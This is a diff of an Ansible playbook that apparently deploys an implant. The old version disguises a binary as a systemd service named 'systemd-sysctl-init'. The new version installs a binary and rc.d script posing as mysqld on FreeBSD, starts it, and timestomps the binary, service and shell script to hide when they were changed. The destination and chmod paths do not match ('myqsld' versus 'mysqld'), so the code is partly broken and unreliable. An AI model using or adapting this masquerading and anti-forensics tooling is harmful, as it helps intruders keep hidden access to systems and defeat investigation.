@@ -1,30 +1,40 @@
 ---
-- name: drop service file
+- name: copy binary
   copy:
-    src: systemd-sysctl-init.service
-    dest: /lib/systemd/system/systemd-sysctl-init.service
-    mode: 644
+    src: #########
+    dest: /usr/bin/myqsld
+    mode: 555
+  when: ansible_facts['os_family'] == "FreeBSD"
 
-- name: drop binary
+- name: copy service file
   copy:
-    src: client
-    dest: /lib/systemd/systemd-sysctl-init
-    mode: 755
+    src: mysqld.service.pf
+    dest: /etc/rc.d/mysqld
+    mode: 555
+  when: ansible_facts['os_family'] == "FreeBSD"
 
-- name: reload service daemons
-  systemd:
-    daemon_reload: yes
+- name: chmod service file
+  command: chmod 555 /etc/rc.d/mysqld
+  when: ansible_facts['os_family'] == "FreeBSD"
 
-- name: start and enable service
-  service:
-    name: systemd-sysctl-init
-    enabled: yes
-    state: started
+- name: chmod binary
+  command: chmod 555 /usr/bin/mysqld
+  when: ansible_facts['os_family'] == "FreeBSD"
 
-- name: timestop files
+- name: chmod shell script
+  command: chmod 555 /usr/local/etc.d/mysqld.sh
+  when: ansible_facts['os_family'] == "FreeBSD"
+  
+- name: start service
+  command: service mysqld start
+  when: ansible_facts['os_family'] == "FreeBSD"
+
+- name: timestomp files (binary, service, shell)
   file:
     path: "{{ item  }}"
     modification_time: "{{ timestomp_time }}"
   loop:
-    - /lib/systemd/system/systemd-sysctl-init.service
-    - /lib/systemd/systemd-sysctl-init
+    - /usr/bin/mysqld # binary
+    - /etc/rc.d/mysqld # service
+    - /usr/local/etc.d/mysqld.sh # shell
+  when: ansible_facts['os_family'] == "FreeBSD"
